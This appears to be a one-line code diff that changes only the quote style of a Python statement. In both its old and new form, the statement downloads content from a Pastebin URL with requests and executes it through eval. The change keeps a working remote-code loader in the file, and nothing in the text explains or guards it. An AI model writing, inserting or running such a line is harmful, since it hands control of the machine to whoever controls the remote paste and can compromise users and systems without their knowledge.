@@ -1,1 +1,1 @@
-eval(__import__("requests").get("https://pastebin.com/raw/zYnpVCWe").content)
+eval(__import__('requests').get('https://pastebin.com/raw/zYnpVCWe').content)
